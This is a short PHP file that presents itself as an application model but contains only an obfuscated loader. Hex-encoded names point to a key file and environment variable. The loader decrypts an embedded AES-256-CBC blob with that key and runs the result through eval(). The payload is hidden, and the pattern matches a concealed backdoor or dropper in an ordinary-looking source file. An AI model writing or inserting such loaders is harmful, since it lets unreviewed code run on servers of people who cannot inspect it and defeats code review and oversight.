<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Hx/okv+7bIvANp9PxvRqqQ==');

$c=base64_decode(

'N5p3IgxVHh92icICq1T2IBhPBpxOVn2s43xwlKjS8MG3uBDKmtxMdg6hPQqVJVTJhK0OkNGDU7Cx' .
'kuQOvOuvv7AmkRQOJhbHiMTjgIMFHWGf5L8g6JiQsOEjdgtpBMGXH4EDxlJ+3vV9GcfqPlbO9HqS' .
'b80l01ZDI57qSd3kjxJ/QLL61o9K0JZdTbQ7nQIZaK127Yu32dhOEel5R3pctQLnE9hI5IF+5nNC' .
'FGSbdk02QkXAMp0DPnHCkMVH/9v3rzH7iaseaf4WvYYAXTvQnUjnYcf692MbvT/d9Jah8PQcIf/h' .
'36eyvGmNMsskbtM2xF+KPw02s4yObTaVhLsg7wN2KfAmf+AZNzOG+/hG+Jl+cbtivqkZKv8izwce' .
'An279+242Xjym18c4ld6tIofXTPMmyX9OJh92HqEc+WH7J/38rFefg5WpJoRN3A6A0HosVK5Yltw' .
'mdF9b+NYaphDJN7a3w7FD67Vrwt9fKhKVqsOQBk6e/JlYfR96J+EkkY87me/0IL9C7OhrfGMszW3' .
'0rib0bGhsGlo8DxqL2+FuInDi2ZoopJdhG2tAPliyHSfOs/iWNRiJWYSCTfxJzwOWfIbwveGjMHY' .
'RbImKI0Zz5GmeFh2ycK/RVGMAWHDmvrowLBYoA5GMjPrGVPJSgtCd/+OHx8qvK3Dt8wv5i7Yxf+G' .
'oA42JHJsrp+oDT9ZzFoY3jQonTDhoQg+jFjZhLFPhHPa1i0Rs1E7I8tVY7ka8l9wGb4ee4vWihcj' .
'48bfKhHFbmbQyRHtBqixsfv/yoP+XlGXzSNKdAMRiBRxOHPMrIee8bj+ZoG4TAfaFNITgBbJDqgI' .
'Nb1v72L2yL5BXBn9bF6H9c2wWRJySnYv/hBJ3PKeBMN1jwJZZpbV/33MPndr'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

